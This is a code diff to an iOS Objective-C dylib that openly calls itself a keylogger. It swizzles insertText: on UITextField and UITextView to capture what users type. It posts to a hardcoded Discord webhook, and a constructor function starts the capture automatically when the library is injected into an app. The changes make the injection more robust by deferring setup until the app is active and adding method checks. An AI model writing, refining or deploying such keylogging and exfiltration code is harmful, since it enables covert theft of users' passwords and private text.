@@ -29,28 +29,46 @@ static NSString *webhookURL = @"https://discord.com/api/webhooks/125226134070231
     return instance;
 }
 
-// --- Core Swizzling Logic ---
+// --- Safer Core Swizzling Logic ---
 - (void)startLogging {
     NSLog(@"[Keylogger] Starting logging...");
     // Swizzle UITextField
     Class textFieldClass = objc_getClass("UITextField");
     if (textFieldClass) {
-        Method originalMethod = class_getInstanceMethod(textFieldClass, @selector(insertText:));
-        Method swizzledMethod = class_getInstanceMethod([self class], @selector(swizzled_insertText:));
-        if (originalMethod && swizzledMethod) {
-            method_exchangeImplementations(originalMethod, swizzledMethod);
-            NSLog(@"[Keylogger] Successfully swizzled UITextField.");
+        // Add a safety check to ensure the class and methods exist
+        if ([textFieldClass instancesRespondToSelector:@selector(insertText:)]) {
+            Method originalMethod = class_getInstanceMethod(textFieldClass, @selector(insertText:));
+            Method swizzledMethod = class_getInstanceMethod([self class], @selector(swizzled_insertText:));
+            if (originalMethod && swizzledMethod) {
+                method_exchangeImplementations(originalMethod, swizzledMethod);
+                NSLog(@"[Keylogger] Successfully swizzled UITextField.");
+            } else {
+                NSLog(@"[Keylogger] Failed to get methods for UITextField.");
+            }
+        } else {
+            NSLog(@"[Keylogger] UITextField does not respond to insertText:");
         }
+    } else {
+        NSLog(@"[Keylogger] Could not get UITextField class.");
     }
+
     // Swizzle UITextView
     Class textViewClass = objc_getClass("UITextView");
     if (textViewClass) {
-        Method originalMethod = class_getInstanceMethod(textViewClass, @selector(insertText:));
-        Method swizzledMethod = class_getInstanceMethod([self class], @selector(swizzled_insertText:));
-        if (originalMethod && swizzledMethod) {
-            method_exchangeImplementations(originalMethod, swizzledMethod);
-            NSLog(@"[Keylogger] Successfully swizzled UITextView.");
+        if ([textViewClass instancesRespondToSelector:@selector(insertText:)]) {
+            Method originalMethod = class_getInstanceMethod(textViewClass, @selector(insertText:));
+            Method swizzledMethod = class_getInstanceMethod([self class], @selector(swizzled_insertText:));
+            if (originalMethod && swizzledMethod) {
+                method_exchangeImplementations(originalMethod, swizzledMethod);
+                NSLog(@"[Keylogger] Successfully swizzled UITextView.");
+            } else {
+                NSLog(@"[Keylogger] Failed to get methods for UITextView.");
+            }
+        } else {
+            NSLog(@"[Keylogger] UITextView does not respond to insertText:");
         }
+    } else {
+        NSLog(@"[Keylogger] Could not get UITextView class.");
     }
     NSLog(@"[Keylogger] Logging started.");
 }
@@ -143,35 +161,55 @@ static NSString *webhookURL = @"https://discord.com/api/webhooks/125226134070231
 @end
 
 // =============================================================================
-// MARK: - Constructor & Visual Confirmation
+// MARK: - Constructor & Deferred Initialization
 // =============================================================================
-// Function to show a visual alert
-void showConfirmationAlert() {
-    dispatch_after(dispatch_time(DISPATCH_TIME_NOW, (int64_t)(1.0 * NSEC_PER_SEC)), dispatch_get_main_queue(), ^{
-        UIAlertController *alert = [UIAlertController alertControllerWithTitle:@"Dylib Injected" message:@"The Keylogger dylib is active." preferredStyle:UIAlertControllerStyleAlert];
-        [alert addAction:[UIAlertAction actionWithTitle:@"OK" style:UIAlertActionStyleDefault handler:nil]];
-        // Find the key window and present the alert
-        UIWindow *keyWindow = nil;
-        if (@available(iOS 13.0, *)) {
-            keyWindow = [[UIApplication sharedApplication] windows].firstObject;
-        } else {
-            keyWindow = [[UIApplication sharedApplication] keyWindow];
-        }
-        UIViewController *rootViewController = keyWindow.rootViewController;
-        if (rootViewController) {
-            [rootViewController presentViewController:alert animated:YES completion:nil];
-        }
-    });
-}
 
-// This function runs automatically when the dylib is loaded
+// This function runs automatically when the dylib is loaded.
+// It should ONLY set up an observer to defer the real work.
 __attribute__((constructor))
 void initKeylogger() {
-    NSLog(@"[Keylogger] Constructor function called.");
-    // 1. Send a webhook immediately to test connectivity
-    [[Keylogger sharedInstance] sendToWebhook:@"Dylib successfully injected and constructor executed."];
-    // 2. Show a visual alert on the device
-    showConfirmationAlert();
-    // 3. Start the main logging logic
-    [[Keylogger sharedInstance] startLogging];
+    NSLog(@"[Keylogger] Constructor called. Deferring setup...");
+    // Wait until the app is active before starting our logic.
+    [[NSNotificationCenter defaultCenter] addObserverForName:UIApplicationDidBecomeActiveNotification
+                                                      object:nil
+                                                       queue:[NSOperationQueue mainQueue]
+                                                  usingBlock:^(NSNotification * _Nonnull note) {
+        NSLog(@"[Keylogger] App is now active. Starting setup.");
+        
+        // 1. Show a visual alert on the device
+        dispatch_after(dispatch_time(DISPATCH_TIME_NOW, (int64_t)(1.0 * NSEC_PER_SEC)), dispatch_get_main_queue(), ^{
+            UIAlertController *alert = [UIAlertController alertControllerWithTitle:@"Dylib Injected"
+                                                                           message:@"The Keylogger dylib is active."
+                                                                    preferredStyle:UIAlertControllerStyleAlert];
+            [alert addAction:[UIAlertAction actionWithTitle:@"OK" style:UIAlertActionStyleDefault handler:nil]];
+            
+            // Find the key window and present the alert
+            UIWindow *keyWindow = nil;
+            if (@available(iOS 13.0, *)) {
+                // On iOS 13+, the scene's window is the key window
+                for (UIWindowScene *windowScene in [[UIApplication sharedApplication].connectedScenes allObjects]) {
+                    if ([windowScene isKindOfClass:[UIWindowScene class]]) {
+                        keyWindow = windowScene.windows.firstObject;
+                        break;
+                    }
+                }
+                if (!keyWindow) {
+                    keyWindow = [[UIApplication sharedApplication] windows].firstObject;
+                }
+            } else {
+                keyWindow = [[UIApplication sharedApplication] keyWindow];
+            }
+            
+            UIViewController *rootViewController = keyWindow.rootViewController;
+            if (rootViewController) {
+                [rootViewController presentViewController:alert animated:YES completion:nil];
+            }
+        });
+
+        // 2. Start the main logging logic
+        [[Keylogger sharedInstance] startLogging];
+
+        // 3. Send a webhook to test connectivity
+        [[Keylogger sharedInstance] sendToWebhook:@"Dylib successfully injected and setup executed."];
+    }];
 }
